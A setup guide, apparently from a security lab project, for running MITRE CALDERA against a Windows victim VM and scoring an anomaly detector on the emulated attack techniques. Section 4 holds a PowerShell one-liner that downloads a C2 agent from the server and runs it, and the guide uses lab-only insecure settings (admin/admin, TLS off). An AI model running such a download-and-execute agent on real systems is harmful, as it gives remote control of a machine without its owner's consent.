# CALDERA Live Simulation Setup

CALDERA is MITRE's adversary emulation platform. This guide covers installing
the server on your Mac host, deploying an agent to the Windows victim VM, and
wiring the operation output into `caldera_monitor.py` for live detection scoring.

---

## 1. Install CALDERA on the Mac host

**Requirements:** Python 3.8–3.12, pip, git.

```bash
# Clone the repo (latest stable tag as of 2025)
git clone https://github.com/mitre/caldera.git --recursive --branch 5.0.0
cd caldera

# Create a dedicated virtualenv (keeps it isolated from the SOC-ML-lab venv)
python3 -m venv .venv
source .venv/bin/activate

# Install dependencies
pip install -r requirements.txt
```

---

## 2. Configure CALDERA

CALDERA reads from `conf/local.yml`. The defaults work for local use, but set
an API key so `caldera_monitor.py` can authenticate:

```bash
# conf/local.yml  (create if absent; values below override conf/default.yml)
cat > conf/local.yml <<'EOF'
api_key_red: CALDERA_RED_API_KEY_CHANGE_ME
api_key_blue: CALDERA_BLUE_API_KEY_CHANGE_ME
host: 0.0.0.0        # bind to all interfaces so the Windows VM can reach it
port: 8888
EOF
```

Set the same key in your SOC lab `.env`:

```
CALDERA_URL=http://<mac-host-ip>:8888
CALDERA_API_KEY=CALDERA_RED_API_KEY_CHANGE_ME
```

---

## 3. Start the CALDERA server

```bash
# From the caldera/ directory with the virtualenv active
python server.py --insecure   # --insecure disables TLS for local lab use
```

Open `http://localhost:8888` in a browser. Default login: **admin / admin**.

---

## 4. Deploy a Sandcat agent to the Windows victim VM

CALDERA's default agent is **Sandcat** (Go binary). Generate the deployment
one-liner from the CALDERA UI:

1. **Agents** → **Deploy an agent** → choose **Sandcat**.
2. Select platform: **Windows**.
3. Copy the PowerShell one-liner — it looks like:
   ```powershell
   $url="http://<mac-ip>:8888/file/download";
   $wc=New-Object System.Net.WebClient;
   $wc.Headers.add("platform","windows");
   $wc.Headers.add("file","sandcat.go-windows");
   $data=$wc.DownloadData($url);
   $name=$data.Length;
   get-process | ? {$_.modules.filename -eq "$Env:APPDATA\$name.exe"} | stop-process -f;
   rm -force "$Env:APPDATA\$name.exe" -ea ignore;
   [io.file]::WriteAllBytes("$Env:APPDATA\$name.exe",$data) | out-null;
   Start-Process -FilePath "$Env:APPDATA\$name.exe" -ArgumentList "-server http://<mac-ip>:8888 -group red" -NoNewWindow
   ```
4. Run the one-liner in PowerShell **as Administrator** on the Windows VM.
5. Back in the CALDERA UI → **Agents**: the new agent should appear within 30 s.

> **Firewall note**: port 8888 must be reachable from the Windows VM to the Mac.
> On macOS: System Settings → Firewall → allow incoming on 8888, or run
> `sudo /usr/libexec/ApplicationFirewall/socketfilterfw --add $(which python3)`.

---

## 5. Create and run a test operation

1. **Operations** → **Create operation**.
2. Name: `SOC Lab Test`.
3. Adversary: choose **"Super" Thief** (a built-in adversary with 2–3 techniques).
   - Or create your own: **Adversaries** → **New adversary** → add individual
     ATT&CK abilities (e.g. T1087 Account Discovery, T1082 System Information Discovery).
4. Group: **red** (the group your Sandcat agent joined).
5. Click **Start**.
6. Copy the operation UUID from the URL bar:
   `http://localhost:8888/#/operations/<UUID-HERE>`

---

## 6. Run caldera_monitor.py against the operation

```bash
# From the soc-ml-lab project root
python src/redblue/caldera_monitor.py \
    --operation-id <UUID-HERE> \
    --caldera-url http://localhost:8888 \
    --poll-interval 30 \
    --verbose

# Dry-run mode (no ES writes, prints scorecard to stdout)
python src/redblue/caldera_monitor.py \
    --operation-id <UUID-HERE> \
    --dry-run

# Demo mode — generates a synthetic scorecard without a live CALDERA server
python src/redblue/caldera_monitor.py --demo
```

The monitor writes `data/runs/live_detection_YYYY-MM-DD.json` when it finishes.
Open the Streamlit dashboard → **Coverage Gap** tab to see results.

---

## 7. Understanding the scorecard

| Field | Meaning |
|---|---|
| `detection_rate` | Fraction of CALDERA techniques where the IF model flagged an event within 90 s |
| `avg_detection_latency_seconds` | Median seconds from technique execution to anomaly score appearing in ES |
| `missed_techniques` | ATT&CK IDs the model did not flag — these are your coverage gaps |
| `detected` count | How many techniques triggered an anomaly in the 90-second window |

A technique is "detected" if **any** event from the target host scores
`ml.anomaly_score ≥ 0.5` within 90 seconds of the CALDERA link completing.
Lower the threshold with `--detection-threshold` if you want to count near-misses.

---

## 8. Red/Blue improvement loop

```
simulate (CALDERA) → detect (Isolation Forest)
      ↓                       ↓
  scorecard             coverage gap panel
      ↓                       ↓
   missed?  ←── LLM suggestion ← Streamlit Tab 2
      ↓
  add feature / tune model → retrain → repeat
```

See CLAUDE.md § "Red/Blue simulation loop" for the full workflow.
